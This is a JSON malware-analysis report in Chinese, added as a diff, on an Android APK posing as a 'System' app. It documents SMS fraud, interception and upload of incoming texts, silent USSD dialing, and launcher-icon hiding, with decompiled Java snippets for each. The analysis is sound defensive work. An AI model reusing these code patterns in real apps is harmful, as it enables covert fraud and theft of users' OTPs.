@@ -1,0 +1,162 @@
+{
+  "APK信息": {
+    "文件名": "34be3c24b553d960aeb6a3c5f0b9c43b1aa8924f4b9aa87c14e96260b7861236.apk",
+    "sha256": "34be3c24b553d960aeb6a3c5f0b9c43b1aa8924f4b9aa87c14e96260b7861236",
+    "包名": "com.fanta.services",
+    "应用名": "System",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 226.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fanta\\services\\SocketService;",
+          "method_signature": "sendSms(MessageItem item)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(item.phone, null, item.text, sentPendingIntent, DeliverPending);",
+          "malicious_code_snippet_context": "          Intent intentDeliver = new Intent(this.DELIVERED);\n          intentDeliver.putExtra(Const.CONST_ID_SEND_SMS, item.id);\n          PendingIntent DeliverPending = PendingIntent.getBroadcast(this.ctx, reqCode, intentDeliver, 0);\n>>>         SmsManager smsManager = SmsManager.getDefault();\n>>>         try {\n              smsManager.sendTextMessage(item.phone, null, item.text, sentPendingIntent, DeliverPending);\n          } catch (Exception e) {\n              setStatusSms(item.id, 7);",
+          "behavior_description": "代码通过 SmsManager.sendTextMessage() 静默发送短信，短信内容和目标号码来源于 MessageItem 对象的 phone 和 text 字段，可能用于短信欺诈或向C2服务器发送数据。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\fanta\\services\\Receiver;",
+          "method_signature": "if(!s.equals(message.phone)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String s = strArr[i];\nif (!s.equals(message.phone)) {\n    i++;\n} else {\n    try {\n        abortBroadcast();\n        break;\n    } catch (Exception ex) {\n        ex.printStackTrace();\n    }\n}\nDbHelper dbHelper2 = new DbHelper(context);\ndbHelper2.inserMessage(message);\ndbHelper2.close();\nUtils.saveSmsServer(this.app.socket, context);",
+          "malicious_code_snippet_context": "                      if (i >= length) {\n                          break;\n                      }\n>>>                     String s = strArr[i];\n>>>                     if (!s.equals(message.phone)) {\n>>>                         i++;\n>>>                     } else {\n>>>                         try {\n>>>                             abortBroadcast();\n>>>                             break;\n>>>                         } catch (Exception ex) {\n>>>                             ex.printStackTrace();\n>>>                         }\n>>>                     }\n>>>                 }\n>>>                 DbHelper dbHelper2 = new DbHelper(context);\n>>>                 dbHelper2.inserMessage(message);\n>>>                 dbHelper2.close();\n                  Utils.saveSmsServer(this.app.socket, context);\n              }\n          }",
+          "behavior_description": "代码在BroadcastReceiver中接收短信广播，遍历预设手机号数组strArr与 incoming SMS 的发送方号码进行匹配。一旦匹配成功，立即调用abortBroadcast()中止广播继续传递，使系统默认短信应用无法收到该短信，实现对特定短信的静默拦截隐藏。随后将拦截到的短信内容存入本地数据库DbHelper，并通过Utils.saveSmsServer上传至远程服务器。数据流向：短信广播Intent(source)→abortBroadcast()拦截+本地存储+远程上传(sink)。这是典型的短信拦截木马行为，常用于窃取银行验证码/OTP等敏感短信。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fanta\\services\\SocketService;",
+          "method_signature": "ussd(String command, int id)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String encodedHash = Uri.encode(\"#\");\nString ussd = command + \"\" + encodedHash;\nIntent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + ussd));\nintent.addFlags(268435456);\nthis.ctx.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      private void ussd(String command, int id) {\n          try {\n>>>             String encodedHash = Uri.encode(\"#\");\n>>>             String ussd = command + \"\" + encodedHash;\n>>>             M.d(\"ussd(): \", ussd);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + ussd));\n>>>             intent.addFlags(268435456);\n              if (id > 0 && Build.VERSION.SDK_INT >= 23 && checkSelfPermission(\"android.permission.CALL_PHONE\") != 0) {\n                  setStatusSms(id, 7);\n              } else {",
+          "behavior_description": "该方法接收外部传入的 command 参数，拼接编码后的 # 号构造 USSD 命令，通过 android.intent.action.CALL 直接发起电话呼叫（而非调起拨号面板 ACTION_DIAL），无需用户确认即可执行 USSD 交互。USSD 命令可用于查询银行余额、发起转账、订阅付费服务等，在恶意样本中通常由 C2 服务器远程下发指令触发，可造成用户直接经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fanta\\services\\MainActivity;",
+          "method_signature": "onClick(View v)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager p = getPackageManager();\nComponentName componentName = new ComponentName(this.ctx.getPackageName(), this.ctx.getClass().getName());\np.setComponentEnabledSetting(componentName, 2, 1);",
+          "malicious_code_snippet_context": "                  MainActivity.this.closeActivity();\n              }\n          });\n>>>         PackageManager p = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this.ctx.getPackageName(), this.ctx.getClass().getName());\n>>>         p.setComponentEnabledSetting(componentName, 2, 1);\n          if (this.app.getSid() < 1) {\n              Intent i = new Intent(this, (Class<?>) AdmActivity.class);\n              i.addFlags(268435456);",
+          "behavior_description": "代码通过PackageManager获取当前应用MainActivity的ComponentName，然后调用setComponentEnabledSetting将其设置为COMPONENT_ENABLED_STATE_DISABLED(值2)，使用DONT_KILL_APP标志(值1)避免应用重启。这会禁用MainActivity组件，导致应用图标从启动器中消失，用户无法通过常规方式找到和卸载该恶意应用，从而实现隐蔽驻留。这是恶意软件常用的图标隐藏技术，通常在首次启动后执行，配合后台Service保活实现持久化运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
